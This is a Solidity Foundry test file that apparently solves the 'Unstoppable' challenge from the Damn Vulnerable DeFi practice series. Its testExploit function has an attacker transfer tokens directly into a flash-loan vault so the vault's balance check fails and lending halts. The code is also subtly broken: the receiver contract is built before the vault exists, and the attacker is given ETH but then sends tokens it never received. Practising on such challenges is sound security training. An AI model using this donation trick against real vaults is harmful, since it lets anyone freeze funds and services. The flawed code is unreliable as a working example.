//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {StdUtils} from "../../lib/forge-std/src/StdUtils.sol";
import {ERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";

contract breakUnstoppable is Test {
    uint256 public constant TOKEN_SUPPLY = 1_000_000e18;
    uint256 public constant ATTACKER_WALLET = 10e18;
    uint256 public constant BORROW_AMOUNT = 100e18;
    UnstoppableVault vault;
    DamnValuableToken dvt;
    ReceiverUnstoppable receiverUnstoppable;

    address owner = makeAddr("owner");
    //e the person reaps the rewards for depositing in the vault
    address feeRecipient = makeAddr("feeRecipient");
    address attacker = makeAddr("attacker");
    address user = makeAddr("user");

    function setUp() public {
        receiverUnstoppable = new ReceiverUnstoppable(address(vault));
        dvt = new DamnValuableToken();
        vault = new UnstoppableVault(
            dvt,
            address(owner),
            address(feeRecipient)
        );

        //approve the tokens with vault address
        dvt.approve(address(vault), TOKEN_SUPPLY);
        //deposit the tokens to vault address as the fee recipient
        dvt.transfer(address(vault), TOKEN_SUPPLY);
        //The vault has 1 million tokens now
    }

    function testConfig() public {
        console.log("Balance of vault : ", dvt.balanceOf(address(vault)));
        assertEq(dvt.balanceOf(address(vault)), TOKEN_SUPPLY);
    }

    //dangerous equation in contract
    //attacker sends a small amount of eth to the contract increasing the total supply
    //Causing an exploit

    function testExploit() public {
        //Arrange
        vm.deal(attacker, ATTACKER_WALLET);
        vm.startPrank(attacker);
        dvt.transfer(address(vault), ATTACKER_WALLET);

        //Act/Assert
        vm.expectRevert("InvalidBalance");
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(user);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
